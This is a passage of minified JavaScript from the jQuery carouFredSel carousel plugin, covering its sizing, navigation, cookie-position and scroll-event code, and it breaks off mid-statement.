nv_enableNavi(t,e,i){if(!t.circular&&!t.infinite){var o=("removeClass"==e||"addClass"==e)&&e,n=cf_c("disabled",i);if(t.auto.button&&o&&t.auto.button[o](n),t.prev.button){var s=o||0==e?"addClass":"removeClass";t.prev.button[s](n)}if(t.next.button){s=o||e==t.items.visible?"addClass":"removeClass";t.next.button[s](n)}}}function go_getObject(t,e){return is_function(e)?e=e.call(t):is_undefined(e)&&(e={}),e}function go_getItemsObject(t,e){return is_number(e=go_getObject(t,e))?e={visible:e}:"variable"==e?e={visible:e,width:e,height:e}:is_object(e)||(e={}),e}function go_getScrollObject(t,e){return is_number(e=go_getObject(t,e))?e=50>=e?{items:e}:{duration:e}:is_string(e)?e={easing:e}:is_object(e)||(e={}),e}function go_getNaviObject(t,e){if(is_string(e=go_getObject(t,e))){var i=cf_getKeyCode(e);e=-1==i?$(e):i}return e}function go_getAutoObject(t,e){return is_jquery(e=go_getNaviObject(t,e))?e={button:e}:is_boolean(e)?e={play:e}:is_number(e)&&(e={timeoutDuration:e}),e.progress&&(is_string(e.progress)||is_jquery(e.progress))&&(e.progress={bar:e.progress}),e}function go_complementAutoObject(t,e){return is_function(e.button)&&(e.button=e.button.call(t)),is_string(e.button)&&(e.button=$(e.button)),is_boolean(e.play)||(e.play=!0),is_number(e.delay)||(e.delay=0),is_undefined(e.pauseOnEvent)&&(e.pauseOnEvent=!0),is_boolean(e.pauseOnResize)||(e.pauseOnResize=!0),is_number(e.timeoutDuration)||(e.timeoutDuration=10>e.duration?2500:5*e.duration),e.progress&&(is_function(e.progress.bar)&&(e.progress.bar=e.progress.bar.call(t)),is_string(e.progress.bar)&&(e.progress.bar=$(e.progress.bar)),e.progress.bar?(is_function(e.progress.updater)||(e.progress.updater=$.fn.carouFredSel.progressbarUpdater),is_number(e.progress.interval)||(e.progress.interval=50)):e.progress=!1),e}function go_getPrevNextObject(t,e){return is_jquery(e=go_getNaviObject(t,e))?e={button:e}:is_number(e)&&(e={key:e}),e}function go_complementPrevNextObject(t,e){return is_function(e.button)&&(e.button=e.button.call(t)),is_string(e.button)&&(e.button=$(e.button)),is_string(e.key)&&(e.key=cf_getKeyCode(e.key)),e}function go_getPaginationObject(t,e){return is_jquery(e=go_getNaviObject(t,e))?e={container:e}:is_boolean(e)&&(e={keys:e}),e}function go_complementPaginationObject(t,e){return is_function(e.container)&&(e.container=e.container.call(t)),is_string(e.container)&&(e.container=$(e.container)),is_number(e.items)||(e.items=!1),is_boolean(e.keys)||(e.keys=!1),is_function(e.anchorBuilder)||is_false(e.anchorBuilder)||(e.anchorBuilder=$.fn.carouFredSel.pageAnchorBuilder),is_number(e.deviation)||(e.deviation=0),e}function go_getSwipeObject(t,e){return is_function(e)&&(e=e.call(t)),is_undefined(e)&&(e={onTouch:!1}),is_true(e)?e={onTouch:e}:is_number(e)&&(e={items:e}),e}function go_complementSwipeObject(t,e){return is_boolean(e.onTouch)||(e.onTouch=!0),is_boolean(e.onMouse)||(e.onMouse=!1),is_object(e.options)||(e.options={}),is_boolean(e.options.triggerOnTouchEnd)||(e.options.triggerOnTouchEnd=!1),e}function go_getMousewheelObject(t,e){return is_function(e)&&(e=e.call(t)),is_true(e)?e={}:is_number(e)?e={items:e}:is_undefined(e)&&(e=!1),e}function go_complementMousewheelObject(t,e){return e}function gn_getItemIndex(t,e,i,o,n){if(is_string(t)&&(t=$(t,n)),is_object(t)&&(t=$(t,n)),is_jquery(t)?(t=n.children().index(t),is_boolean(i)||(i=!1)):is_boolean(i)||(i=!0),is_number(t)||(t=0),is_number(e)||(e=0),i&&(t+=o.first),t+=e,o.total>0){for(;t>=o.total;)t-=o.total;for(;0>t;)t+=o.total}return t}function gn_getVisibleItemsPrev(t,e,i){for(var o=0,n=0,s=i;s>=0;s--){var r=t.eq(s);if((o+=r.is(":visible")?r[e.d.outerWidth](!0):0)>e.maxDimension)return n;0==s&&(s=t.length),n++}}function gn_getVisibleItemsPrevFilter(t,e,i){return gn_getItemsPrevFilter(t,e.items.filter,e.items.visibleConf.org,i)}function gn_getScrollItemsPrevFilter(t,e,i,o){return gn_getItemsPrevFilter(t,e.items.filter,o,i)}function gn_getItemsPrevFilter(t,e,i,o){for(var n=0,s=0,r=o,a=t.length;r>=0;r--){if(++s==a)return s;if(t.eq(r).is(e)&&++n==i)return s;0==r&&(r=a)}}function gn_getVisibleOrg(t,e){return e.items.visibleConf.org||t.children().slice(0,e.items.visible).filter(e.items.filter).length}function gn_getVisibleItemsNext(t,e,i){for(var o=0,n=0,s=i,r=t.length-1;r>=s;s++){var a=t.eq(s);if((o+=a.is(":visible")?a[e.d.outerWidth](!0):0)>e.maxDimension)return n;if(++n==r+1)return n;s==r&&(s=-1)}}function gn_getVisibleItemsNextTestCircular(t,e,i,o){var n=gn_getVisibleItemsNext(t,e,i);return e.circular||i+n>o&&(n=o-i),n}function gn_getVisibleItemsNextFilter(t,e,i){return gn_getItemsNextFilter(t,e.items.filter,e.items.visibleConf.org,i,e.circular)}function gn_getScrollItemsNextFilter(t,e,i,o){return gn_getItemsNextFilter(t,e.items.filter,o+1,i,e.circular)-1}function gn_getItemsNextFilter(t,e,i,o){for(var n=0,s=0,r=o,a=t.length-1;a>=r;r++){if(++s>=a)return s;if(t.eq(r).is(e)&&++n==i)return s;r==a&&(r=-1)}}function gi_getCurrentItems(t,e){return t.slice(0,e.items.visible)}function gi_getOldItemsPrev(t,e,i){return t.slice(i,e.items.visibleConf.old+i)}function gi_getNewItemsPrev(t,e){return t.slice(0,e.items.visible)}function gi_getOldItemsNext(t,e){return t.slice(0,e.items.visibleConf.old)}function gi_getNewItemsNext(t,e,i){return t.slice(i,e.items.visible+i)}function sz_storeMargin(t,e,i){e.usePadding&&(is_string(i)||(i="_cfs_origCssMargin"),t.each((function(){var t=$(this),o=parseInt(t.css(e.d.marginRight),10);is_number(o)||(o=0),t.data(i,o)})))}function sz_resetMargin(t,e,i){if(e.usePadding){var o=!!is_boolean(i)&&i;is_number(i)||(i=0),sz_storeMargin(t,e,"_cfs_tempCssMargin"),t.each((function(){var t=$(this);t.css(e.d.marginRight,o?t.data("_cfs_tempCssMargin"):i+t.data("_cfs_origCssMargin"))}))}}function sz_storeOrigCss(t){t.each((function(){var t=$(this);t.data("_cfs_origCss",t.attr("style")||"")}))}function sz_restoreOrigCss(t){t.each((function(){var t=$(this);t.attr("style",t.data("_cfs_origCss")||"")}))}function sz_setResponsiveSizes(t,e){var i=(t.items.visible,t.items[t.d.width]),o=t[t.d.height],n=is_percentage(o);e.each((function(){var e=$(this),s=i-ms_getPaddingBorderMargin(e,t,"Width");e[t.d.width](s),n&&e[t.d.height](ms_getPercentage(s,o))}))}function sz_setSizes(t,e){var i=t.parent(),o=t.children(),n=gi_getCurrentItems(o,e),s=cf_mapWrapperSizes(ms_getSizes(n,e,!0),e,!1);if(i.css(s),e.usePadding){var r=e.padding,a=r[e.d[1]];e.align&&0>a&&(a=0);var l=n.last();l.css(e.d.marginRight,l.data("_cfs_origCssMargin")+a),t.css(e.d.top,r[e.d[0]]),t.css(e.d.left,r[e.d[3]])}return t.css(e.d.width,s[e.d.width]+2*ms_getTotalSize(o,e,"width")),t.css(e.d.height,ms_getLargestSize(o,e,"height")),s}function ms_getSizes(t,e,i){return[ms_getTotalSize(t,e,"width",i),ms_getLargestSize(t,e,"height",i)]}function ms_getLargestSize(t,e,i,o){return is_boolean(o)||(o=!1),is_number(e[e.d[i]])&&o?e[e.d[i]]:is_number(e.items[e.d[i]])?e.items[e.d[i]]:ms_getTrueLargestSize(t,e,i=i.toLowerCase().indexOf("width")>-1?"outerWidth":"outerHeight")}function ms_getTrueLargestSize(t,e,i){for(var o=0,n=0,s=t.length;s>n;n++){var r=t.eq(n),a=r.is(":visible")?r[e.d[i]](!0):0;a>o&&(o=a)}return o}function ms_getTotalSize(t,e,i,o){if(is_boolean(o)||(o=!1),is_number(e[e.d[i]])&&o)return e[e.d[i]];if(is_number(e.items[e.d[i]]))return e.items[e.d[i]]*t.length;for(var n=i.toLowerCase().indexOf("width")>-1?"outerWidth":"outerHeight",s=0,r=0,a=t.length;a>r;r++){var l=t.eq(r);s+=l.is(":visible")?l[e.d[n]](!0):0}return s}function ms_getParentSize(t,e,i){var o=t.is(":visible");o&&t.hide();var n=t.parent()[e.d[i]]();return o&&t.show(),n}function ms_getMaxDimension(t,e){return is_number(t[t.d.width])?t[t.d.width]:e}function ms_hasVariableSizes(t,e,i){for(var o=!1,n=!1,s=0,r=t.length;r>s;s++){var a=t.eq(s),l=a.is(":visible")?a[e.d[i]](!0):0;!1===o?o=l:o!=l&&(n=!0),0==o&&(n=!0)}return n}function ms_getPaddingBorderMargin(t,e,i){return t[e.d["outer"+i]](!0)-t[e.d[i.toLowerCase()]]()}function ms_getPercentage(t,e){if(is_percentage(e)){if(!is_number(e=parseInt(e.slice(0,-1),10)))return t;t*=e/100}return t}function cf_e(t,e,i,o,n){return is_boolean(i)||(i=!0),is_boolean(o)||(o=!0),is_boolean(n)||(n=!1),i&&(t=e.events.prefix+t),o&&(t=t+"."+e.events.namespace),o&&n&&(t+=e.serialNumber),t}function cf_c(t,e){return is_string(e.classnames[t])?e.classnames[t]:t}function cf_mapWrapperSizes(t,e,i){is_boolean(i)||(i=!0);var o=e.usePadding&&i?e.padding:[0,0,0,0],n={};return n[e.d.width]=t[0]+o[1]+o[3],n[e.d.height]=t[1]+o[0]+o[2],n}function cf_sortParams(t,e){for(var i=[],o=0,n=t.length;n>o;o++)for(var s=0,r=e.length;r>s;s++)if(e[s].indexOf(typeof t[o])>-1&&is_undefined(i[s])){i[s]=t[o];break}return i}function cf_getPadding(t){if(is_undefined(t))return[0,0,0,0];if(is_number(t))return[t,t,t,t];if(is_string(t)&&(t=t.split("px").join("").split("em").join("").split(" ")),!is_array(t))return[0,0,0,0];for(var e=0;4>e;e++)t[e]=parseInt(t[e],10);switch(t.length){case 0:return[0,0,0,0];case 1:return[t[0],t[0],t[0],t[0]];case 2:return[t[0],t[1],t[0],t[1]];case 3:return[t[0],t[1],t[2],t[1]];default:return[t[0],t[1],t[2],t[3]]}}function cf_getAlignPadding(t,e){var i=is_number(e[e.d.width])?Math.ceil(e[e.d.width]-ms_getTotalSize(t,e,"width")):0;switch(e.align){case"left":return[0,i];case"right":return[i,0];case"center":default:return[Math.ceil(i/2),Math.floor(i/2)]}}function cf_getDimensions(t){for(var e=[["width","innerWidth","outerWidth","height","innerHeight","outerHeight","left","top","marginRight",0,1,2,3],["height","innerHeight","outerHeight","width","innerWidth","outerWidth","top","left","marginBottom",3,2,1,0]],i=e[0].length,o="right"==t.direction||"left"==t.direction?0:1,n={},s=0;i>s;s++)n[e[0][s]]=e[o][s];return n}function cf_getAdjust(t,e,i,o){var n=t;if(is_function(i))n=i.call(o,n);else if(is_string(i)){var s=i.split("+"),r=i.split("-");if(r.length>s.length)var a=!0,l=r[0],c=r[1];else a=!1,l=s[0],c=s[1];switch(l){case"even":n=1==t%2?t-1:t;break;case"odd":n=0==t%2?t-1:t;break;default:n=t}is_number(c=parseInt(c,10))&&(a&&(c=-c),n+=c)}return(!is_number(n)||1>n)&&(n=1),n}function cf_getItemsAdjust(t,e,i,o){return cf_getItemAdjustMinMax(cf_getAdjust(t,e,i,o),e.items.visibleConf)}function cf_getItemAdjustMinMax(t,e){return is_number(e.min)&&e.min>t&&(t=e.min),is_number(e.max)&&t>e.max&&(t=e.max),1>t&&(t=1),t}function cf_getSynchArr(t){is_array(t)||(t=[[t]]),is_array(t[0])||(t=[t]);for(var e=0,i=t.length;i>e;e++)is_string(t[e][0])&&(t[e][0]=$(t[e][0])),is_boolean(t[e][1])||(t[e][1]=!0),is_boolean(t[e][2])||(t[e][2]=!0),is_number(t[e][3])||(t[e][3]=0);return t}function cf_getKeyCode(t){return"right"==t?39:"left"==t?37:"up"==t?38:"down"==t?40:-1}function cf_setCookie(t,e,i){if(t){var o=e.triggerHandler(cf_e("currentPosition",i));$.fn.carouFredSel.cookie.set(t,o)}}function cf_getCookie(t){var e=$.fn.carouFredSel.cookie.get(t);return""==e?0:e}function in_mapCss(t,e){for(var i={},o=0,n=e.length;n>o;o++)i[e[o]]=t.css(e[o]);return i}function in_complementItems(t,e,i,o){return is_object(t.visibleConf)||(t.visibleConf={}),is_object(t.sizesConf)||(t.sizesConf={}),0==t.start&&is_number(o)&&(t.start=o),is_object(t.visible)?(t.visibleConf.min=t.visible.min,t.visibleConf.max=t.visible.max,t.visible=!1):is_string(t.visible)?("variable"==t.visible?t.visibleConf.variable=!0:t.visibleConf.adjust=t.visible,t.visible=!1):is_function(t.visible)&&(t.visibleConf.adjust=t.visible,t.visible=!1),is_string(t.filter)||(t.filter=i.filter(":hidden").length>0?":visible":"*"),t[e.d.width]||(e.responsive?(debug(!0,"Set a "+e.d.width+" for the items!"),t[e.d.width]=ms_getTrueLargestSize(i,e,"outerWidth")):t[e.d.width]=ms_hasVariableSizes(i,e,"outerWidth")?"variable":i[e.d.outerWidth](!0)),t[e.d.height]||(t[e.d.height]=ms_hasVariableSizes(i,e,"outerHeight")?"variable":i[e.d.outerHeight](!0)),t.sizesConf.width=t.width,t.sizesConf.height=t.height,t}function in_complementVisibleItems(t,e){return"variable"==t.items[t.d.width]&&(t.items.visibleConf.variable=!0),t.items.visibleConf.variable||(is_number(t[t.d.width])?t.items.visible=Math.floor(t[t.d.width]/t.items[t.d.width]):(t.items.visible=Math.floor(e/t.items[t.d.width]),t[t.d.width]=t.items.visible*t.items[t.d.width],t.items.visibleConf.adjust||(t.align=!1)),("Infinity"==t.items.visible||1>t.items.visible)&&(debug(!0,'Not a valid number of visible items: Set to "variable".'),t.items.visibleConf.variable=!0)),t}function in_complementPrimarySize(t,e,i){return"auto"==t&&(t=ms_getTrueLargestSize(i,e,"outerWidth")),t}function in_complementSecondarySize(t,e,i){return"auto"==t&&(t=ms_getTrueLargestSize(i,e,"outerHeight")),t||(t=e.items[e.d.height]),t}function in_getAlignPadding(t,e){var i=cf_getAlignPadding(gi_getCurrentItems(e,t),t);return t.padding[t.d[1]]=i[1],t.padding[t.d[3]]=i[0],t}function in_getResponsiveValues(t,e){var i=cf_getItemAdjustMinMax(Math.ceil(t[t.d.width]/t.items[t.d.width]),t.items.visibleConf);i>e.length&&(i=e.length);var o=Math.floor(t[t.d.width]/i);return t.items.visible=i,t.items[t.d.width]=o,t[t.d.width]=i*o,t}function bt_pauseOnHoverConfig(t){if(is_string(t))var e=t.indexOf("immediate")>-1,i=t.indexOf("resume")>-1;else e=i=!1;return[e,i]}function bt_mousesheelNumber(t){return is_number(t)?t:null}function is_null(t){return null===t}function is_undefined(t){return is_null(t)||void 0===t||""===t||"undefined"===t}function is_array(t){return t instanceof Array}function is_jquery(t){return t instanceof jQuery}function is_object(t){return(t instanceof Object||"object"==typeof t)&&!is_null(t)&&!is_jquery(t)&&!is_array(t)&&!is_function(t)}function is_number(t){return(t instanceof Number||"number"==typeof t)&&!isNaN(t)}function is_string(t){return(t instanceof String||"string"==typeof t)&&!is_undefined(t)&&!is_true(t)&&!is_false(t)}function is_function(t){return t instanceof Function||"function"==typeof t}function is_boolean(t){return t instanceof Boolean||"boolean"==typeof t||is_true(t)||is_false(t)}function is_true(t){return!0===t||"true"===t}function is_false(t){return!1===t||"false"===t}function is_percentage(t){return is_string(t)&&"%"==t.slice(-1)}function getTime(){return(new Date).getTime()}function deprecated(t,e){debug(!0,t+" is DEPRECATED, support for it will be removed. Use "+e+" instead.")}function debug(t,e){if(!is_undefined(window.console)&&!is_undefined(window.console.log)){if(is_object(t)){var i=" ("+t.selector+")";t=t.debug}else i="";if(!t)return!1;e=is_string(e)?"carouFredSel"+i+": "+e:["carouFredSel"+i+":",e],window.console.log(e)}return!1}$.fn.carouFredSel||($.fn.caroufredsel=$.fn.carouFredSel=function(options,configs){if(0==this.length)return debug(!0,'No element found for "'+this.selector+'".'),this;if(this.length>1)return this.each((function(){$(this).carouFredSel(options,configs)}));var $cfs=this,$tt0=this[0],starting_position=!1;$cfs.data("_cfs_isCarousel")&&(starting_position=$cfs.triggerHandler("_cfs_triggerEvent","currentPosition"),$cfs.trigger("_cfs_triggerEvent",["destroy",!0]));var FN={_init:function(t,e,i){(t=go_getObject($tt0,t)).items=go_getItemsObject($tt0,t.items),t.scroll=go_getScrollObject($tt0,t.scroll),t.auto=go_getAutoObject($tt0,t.auto),t.prev=go_getPrevNextObject($tt0,t.prev),t.next=go_getPrevNextObject($tt0,t.next),t.pagination=go_getPaginationObject($tt0,t.pagination),t.swipe=go_getSwipeObject($tt0,t.swipe),t.mousewheel=go_getMousewheelObject($tt0,t.mousewheel),e&&(opts_orig=$.extend(!0,{},$.fn.carouFredSel.defaults,t)),(opts=$.extend(!0,{},$.fn.carouFredSel.defaults,t)).d=cf_getDimensions(opts),crsl.direction="up"==opts.direction||"left"==opts.direction?"next":"prev";var o=$cfs.children(),n=ms_getParentSize($wrp,opts,"width");if(is_true(opts.cookie)&&(opts.cookie="caroufredsel_cookie_"+conf.serialNumber),opts.maxDimension=ms_getMaxDimension(opts,n),opts.items=in_complementItems(opts.items,opts,o,i),opts[opts.d.width]=in_complementPrimarySize(opts[opts.d.width],opts,o),opts[opts.d.height]=in_complementSecondarySize(opts[opts.d.height],opts,o),opts.responsive&&(is_percentage(opts[opts.d.width])||(opts[opts.d.width]="100%")),is_percentage(opts[opts.d.width])&&(crsl.upDateOnWindowResize=!0,crsl.primarySizePercentage=opts[opts.d.width],opts[opts.d.width]=ms_getPercentage(n,crsl.primarySizePercentage),opts.items.visible||(opts.items.visibleConf.variable=!0)),opts.responsive?(opts.usePadding=!1,opts.padding=[0,0,0,0],opts.align=!1,opts.items.visibleConf.variable=!1):(opts.items.visible||(opts=in_complementVisibleItems(opts,n)),opts[opts.d.width]||(!opts.items.visibleConf.variable&&is_number(opts.items[opts.d.width])&&"*"==opts.items.filter?(opts[opts.d.width]=opts.items.visible*opts.items[opts.d.width],opts.align=!1):opts[opts.d.width]="variable"),is_undefined(opts.align)&&(opts.align=!!is_number(opts[opts.d.width])&&"center"),opts.items.visibleConf.variable&&(opts.items.visible=gn_getVisibleItemsNext(o,opts,0))),"*"==opts.items.filter||opts.items.visibleConf.variable||(opts.items.visibleConf.org=opts.items.visible,opts.items.visible=gn_getVisibleItemsNextFilter(o,opts,0)),opts.items.visible=cf_getItemsAdjust(opts.items.visible,opts,opts.items.visibleConf.adjust,$tt0),opts.items.visibleConf.old=opts.items.visible,opts.responsive)opts.items.visibleConf.min||(opts.items.visibleConf.min=opts.items.visible),opts.items.visibleConf.max||(opts.items.visibleConf.max=opts.items.visible),opts=in_getResponsiveValues(opts,o,n);else switch(opts.padding=cf_getPadding(opts.padding),"top"==opts.align?opts.align="left":"bottom"==opts.align&&(opts.align="right"),opts.align){case"center":case"left":case"right":"variable"!=opts[opts.d.width]&&((opts=in_getAlignPadding(opts,o)).usePadding=!0);break;default:opts.align=!1,opts.usePadding=0!=opts.padding[0]||0!=opts.padding[1]||0!=opts.padding[2]||0!=opts.padding[3]}is_number(opts.scroll.duration)||(opts.scroll.duration=500),is_undefined(opts.scroll.items)&&(opts.scroll.items=opts.responsive||opts.items.visibleConf.variable||"*"!=opts.items.filter?"visible":opts.items.visible),opts.auto=$.extend(!0,{},opts.scroll,opts.auto),opts.prev=$.extend(!0,{},opts.scroll,opts.prev),opts.next=$.extend(!0,{},opts.scroll,opts.next),opts.pagination=$.extend(!0,{},opts.scroll,opts.pagination),opts.auto=go_complementAutoObject($tt0,opts.auto),opts.prev=go_complementPrevNextObject($tt0,opts.prev),opts.next=go_complementPrevNextObject($tt0,opts.next),opts.pagination=go_complementPaginationObject($tt0,opts.pagination),opts.swipe=go_complementSwipeObject($tt0,opts.swipe),opts.mousewheel=go_complementMousewheelObject($tt0,opts.mousewheel),opts.synchronise&&(opts.synchronise=cf_getSynchArr(opts.synchronise)),opts.auto.onPauseStart&&(opts.auto.onTimeoutStart=opts.auto.onPauseStart,deprecated("auto.onPauseStart","auto.onTimeoutStart")),opts.auto.onPausePause&&(opts.auto.onTimeoutPause=opts.auto.onPausePause,deprecated("auto.onPausePause","auto.onTimeoutPause")),opts.auto.onPauseEnd&&(opts.auto.onTimeoutEnd=opts.auto.onPauseEnd,deprecated("auto.onPauseEnd","auto.onTimeoutEnd")),opts.auto.pauseDuration&&(opts.auto.timeoutDuration=opts.auto.pauseDuration,deprecated("auto.pauseDuration","auto.timeoutDuration"))},_build:function(){$cfs.data("_cfs_isCarousel",!0);var t=$cfs.children(),e=in_mapCss($cfs,["textAlign","float","position","top","right","bottom","left","zIndex","width","height","marginTop","marginRight","marginBottom","marginLeft"]),i="relative";switch(e.position){case"absolute":case"fixed":i=e.position}"parent"==conf.wrapper?sz_storeOrigCss($wrp):$wrp.css(e),$wrp.css({overflow:"hidden",position:i}),sz_storeOrigCss($cfs),$cfs.data("_cfs_origCssZindex",e.zIndex),$cfs.css({textAlign:"left",float:"none",position:"absolute",top:0,right:"auto",bottom:"auto",left:0,marginTop:0,marginRight:0,marginBottom:0,marginLeft:0}),sz_storeMargin(t,opts),sz_storeOrigCss(t),opts.responsive&&sz_setResponsiveSizes(opts,t)},_bind_events:function(){FN._unbind_events(),$cfs.bind(cf_e("stop",conf),(function(t,e){return t.stopPropagation(),crsl.isStopped||opts.auto.button&&opts.auto.button.addClass(cf_c("stopped",conf)),crsl.isStopped=!0,opts.auto.play&&(opts.auto.play=!1,$cfs.trigger(cf_e("pause",conf),e)),!0})),$cfs.bind(cf_e("finish",conf),(function(t){return t.stopPropagation(),crsl.isScrolling&&sc_stopScroll(scrl),!0})),$cfs.bind(cf_e("pause",conf),(function(t,e,i){if(t.stopPropagation(),tmrs=sc_clearTimers(tmrs),e&&crsl.isScrolling){scrl.isStopped=!0;var o=getTime()-scrl.startTime;scrl.duration-=o,scrl.pre&&(scrl.pre.duration-=o),scrl.post&&(scrl.post.duration-=o),sc_stopScroll(scrl,!1)}if(crsl.isPaused||crsl.isScrolling||i&&(tmrs.timePassed+=getTime()-tmrs.startTime),crsl.isPaused||opts.auto.button&&opts.auto.button.addClass(cf_c("paused",conf)),crsl.isPaused=!0,opts.auto.onTimeoutPause){var n=opts.auto.timeoutDuration-tmrs.timePassed,s=100-Math.ceil(100*n/opts.auto.timeoutDuration);opts.auto.onTimeoutPause.call($tt0,s,n)}return!0})),$cfs.bind(cf_e("play",conf),(function(t,e,i,o){t.stopPropagation(),tmrs=sc_clearTimers(tmrs);var n=cf_sortParams([e,i,o],["string","number","boolean"]);if(e=n[0],i=n[1],o=n[2],"prev"!=e&&"next"!=e&&(e=crsl.direction),is_number(i)||(i=0),is_boolean(o)||(o=!1),o&&(crsl.isStopped=!1,opts.auto.play=!0),!opts.auto.play)return t.stopImmediatePropagation(),debug(conf,"Carousel stopped: Not scrolling.");crsl.isPaused&&opts.auto.button&&(opts.auto.button.removeClass(cf_c("stopped",conf)),opts.auto.button.removeClass(cf_c("paused",conf))),crsl.isPaused=!1,tmrs.startTime=getTime();var s=opts.auto.timeoutDuration+i;return dur2=s-tmrs.timePassed,perc=100-Math.ceil(100*dur2/s),opts.auto.progress&&(tmrs.progress=setInterval((function(){var t=getTime()-tmrs.startTime+tmrs.timePassed,e=Math.ceil(100*t/s);opts.auto.progress.updater.call(opts.auto.progress.bar[0],e)}),opts.auto.progress.interval)),tmrs.auto=setTimeout((function(){opts.auto.progress&&opts.auto.progress.updater.call(opts.auto.progress.bar[0],100),opts.auto.onTimeoutEnd&&opts.auto.onTimeoutEnd.call($tt0,perc,dur2),crsl.isScrolling?$cfs.trigger(cf_e("play",conf),e):$cfs.trigger(cf_e(e,conf),opts.auto)}),dur2),opts.auto.onTimeoutStart&&opts.auto.onTimeoutStart.call($tt0,perc,dur2),!0})),$cfs.bind(cf_e("resume",conf),(function(t){return t.stopPropagation(),scrl.isStopped?(scrl.isStopped=!1,crsl.isPaused=!1,crsl.isScrolling=!0,scrl.startTime=getTime(),sc_startScroll(scrl,conf)):$cfs.trigger(cf_e("play",conf)),!0})),$cfs.bind(cf_e("prev",conf)+" "+cf_e("next",conf),(function(t,e,i,o,n){if(t.stopPropagation(),crsl.isStopped||$cfs.is(":hidden"))return t.stopImmediatePropagation(),debug(conf,"Carousel stopped or hidden: Not scrolling.");var s=is_number(opts.items.minimum)?opts.items.minimum:opts.items.visible+1;if(s>itms.total)return t.stopImmediatePropagation(),debug(conf,"Not enough items ("+itms.total+" total, "+s+" needed): Not scrolling.");e=(l=cf_sortParams([e,i,o,n],["object","number/string","function","boolean"]))[0],i=l[1],o=l[2],n=l[3];var r=t.type.slice(conf.events.prefix.length);if(is_object(e)||(e={}),is_function(o)&&(e.onAfter=o),is_boolean(n)&&(e.queue=n),(e=$.extend(!0,{},opts[r],e)).conditions&&!e.conditions.call($tt0,r))return t.stopImmediatePropagation(),debug(conf,'Callback "conditions" returned false.');if(!is_number(i)){if("*"!=opts.items.filter)i="visible";else for(var a=[i,e.items,opts[r].items],l=0,c=a.length;c>l;l++)if(is_number(a[l])||"page"==a[l]||"visible"==a[l]){i=a[l];break}switch(i){case"page":return t.stopImmediatePropagation(),$cfs.triggerHandler(cf_e(r+"Page",conf),[e,o]);case"visible":opts.items.visibleConf.variable||"*"!=opts.items.filter||(i=opts.items.visible)}}if(scrl.isStopped)return $cfs.trigger(cf_e("resume",conf)),$cfs.trigger(cf_e("queue",conf),[r,[e,i,o]]),t.stopImmediatePropagation(),debug(conf,"Carousel resumed scrolling.");if(e.duration>0&&crsl.isScrolling)return e.queue&&("last"==e.queue&&(queu=[]),("first"!=e.queue||0==queu.length)&&$cfs.trigger(cf_e("queue",conf),[r,[e,i,o]])),t.stopImmediatePropagation(),debug(conf,"Carousel currently scrolling.");if(tmrs.timePassed=0,$cfs.trigger(cf_e("slide_"+r,conf),[e,i]),opts.synchronise){var p=opts.synchronise,u=[e,i],d=0;for(c=p.length;c>d;d++){var h=r;p[d][2]||(h="prev"==h?"next":"prev"),p[d][1]||(u[0]=p[d][0].triggerHandler("_cfs_triggerEvent",["configuration",h])),u[1]=i+p[d][3],p[d][0].trigger("_cfs_triggerEvent",["slide_"+h,u])}}return!0})),$cfs.bind(cf_e("slide_prev",conf),(function(t,e,i){t.stopPropagation();var o=$cfs.children();if(!opts.circular&&0==itms.first)return opts.infinite&&$cfs.trigger(cf_e("next",conf),itms.total-1),t.stopImmediatePropagation();if(sz_resetMargin(o,opts),!is_number(i)){if(opts.items.visibleConf.variable)i=gn_getVisibleItemsPrev(o,opts,itms.total-1);else if("*"!=opts.items.filter){var n=is_number(e.items)?e.items:gn_getVisibleOrg($cfs,opts);i=gn_getScrollItemsPrevFilter(o,opts,itms.total-1,n)}else i=opts.items.visible;i=cf_getAdjust(i,opts,e.items,$tt0)}if(opts.circular||itms.total-i<itms.first&&(i=itms.total-itms.first),opts.items.visibleConf.old=opts.items.visible,opts.items.visibleConf.variable)(s=cf_getItemsAdjust(gn_getVisibleItemsNext(o,opts,itms.total-i),opts,opts.items.visibleConf.adjust,$tt0))>=opts.items.visible+i&&itms.total>i&&(i++,s=cf_getItemsAdjust(gn_getVisibleItemsNext(o,opts,itms.total-i),opts,opts.items.visibleConf.adjust,$tt0)),opts.items.visible=s;else if("*"!=opts.items.filter){var s=gn_getVisibleItemsNextFilter(o,opts,itms.total-i);opts.items.visible=cf_getItemsAdjust(s,opts,opts.items.visibleConf.adjust,$tt0)}if(sz_resetMargin(o,opts,!0),0==i)return t.stopImmediatePropagation(),debug(conf,"0 items to scroll: Not scrolling.");for(debug(conf,"Scrolling "+i+" items backward."),itms.first+=i;itms.first>=itms.total;)itms.first-=itms.total;opts.circular||(0==itms.first&&e.onEnd&&e.onEnd.call($tt0,"prev"),opts.infinite||nv_enableNavi(opts,itms.first,conf)),$cfs.children().slice(itms.total-i,itms.total).prependTo($cfs),itms.total<opts.items.visible+i&&$cfs.children().slice(0,opts.items.visible+i-itms.total).clone(!0).appendTo($cfs);var r=gi_getOldItemsPrev(o=$cfs.children(),opts,i),a=gi_getNewItemsPrev(o,opts),l=o.eq(i-1),c=r.last(),p=a.last();sz_resetMargin(o,opts);var u=0,d=0;if(opts.align){var h=cf_getAlignPadding(a,opts);u=h[0],d=h[1]}var f=0>u?opts.padding[opts.d[3]]:0,m=!1,g=$();if(i>opts.items.visible&&(g=o.slice(opts.items.visibleConf.old,i),"directscroll"==e.fx)){var v=opts.items[opts.d.width];l=p,sc_hideHiddenItems(m=g),opts.items[opts.d.width]="variable"}var _=!1,y=ms_getTotalSize(o.slice(0,i),opts,"width"),b=cf_mapWrapperSizes(ms_getSizes(a,opts,!0),opts,!opts.usePadding),w=0,x={},S={},z={},T={},k={},P={},I={},C=sc_getDuration(e,opts,i,y);switch(e.fx){case"cover":case"cover-fade":w=ms_getTotalSize(o.slice(0,opts.items.visible),opts,"width")}m&&(opts.items[opts.d.width]=v),sz_resetMargin(o,opts,!0),d>=0&&sz_resetMargin(c,opts,opts.padding[opts.d[1]]),u>=0&&sz_resetMargin(l,opts,opts.padding[opts.d[3]]),opts.align&&(opts.padding[opts.d[1]]=d,opts.padding[opts.d[3]]=u),P[opts.d.left]=-(y-f),I[opts.d.left]=-(w-f),S[opts.d.left]=b[opts.d.width];var 